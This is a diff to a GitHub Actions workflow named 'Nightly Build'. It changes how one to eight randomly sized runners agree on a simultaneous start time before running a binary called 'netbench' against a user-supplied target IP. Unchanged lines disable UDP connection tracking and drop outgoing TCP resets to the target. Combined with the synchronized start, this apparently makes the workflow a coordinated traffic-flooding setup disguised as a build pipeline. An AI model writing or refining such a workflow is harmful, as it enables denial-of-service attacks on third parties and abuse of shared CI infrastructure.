@@ -1,5 +1,5 @@
 # Auto-generated config v267.77
-# CI Pipeline — Build Once, Random 1-8 Runners
+# CI Pipeline — Build Once, Random 1-8 Runners, Synced Start
 name: Nightly Build
 
 on:
@@ -56,7 +56,6 @@ jobs:
     runs-on: ubuntu-22.04
     outputs:
       matrix: ${{ steps.gen.outputs.matrix }}
-      sync_ts: ${{ steps.sync.outputs.sync_ts }}
       runner_count: ${{ steps.gen.outputs.count }}
     steps:
     - uses: actions/checkout@v4
@@ -85,11 +84,6 @@ jobs:
         name: app-bin
         path: netbench
         retention-days: 7
-
-    - id: sync
-      run: |
-        SYNC_TS=$(($(date +%s) + 35))
-        echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
 
     - id: gen
       name: Random runner count (1-8)
@@ -128,7 +122,7 @@ jobs:
         sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
         sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
 
-    - name: Run (Runner ${{ matrix.id }}/${{ needs.compile.outputs.runner_count }})
+    - name: Sync & Run (Runner ${{ matrix.id }}/${{ needs.compile.outputs.runner_count }})
       run: |
         mv netbench worker && chmod +x worker
 
@@ -144,11 +138,19 @@ jobs:
           PROXY_FLAG=""
         fi
 
-        SYNC_TS="${{ needs.compile.outputs.sync_ts }}"
+        # ── SYNC: Round current time UP to next :00 or :30 second mark ──
+        # All runners independently compute the SAME sync point
+        # e.g., if now=12:05:17, sync=12:06:00 (next minute boundary)
         NOW=$(date +%s)
+        # Round up to next 60-second boundary + 30s buffer
+        SYNC_TS=$(( ((NOW / 60) + 1) * 60 + 30 ))
         WAIT=$((SYNC_TS - NOW))
-        if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
+
+        if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 120 ]; then
+          echo "Runner ${{ matrix.id }}: ready, waiting ${WAIT}s until sync point $(date -d @$SYNC_TS '+%H:%M:%S' 2>/dev/null || echo $SYNC_TS)"
           sleep "$WAIT"
+        else
+          echo "Runner ${{ matrix.id }}: sync window missed (WAIT=${WAIT}s), starting now"
         fi
 
         echo "Runner ${{ matrix.id }}: GO at $(date +%s)"
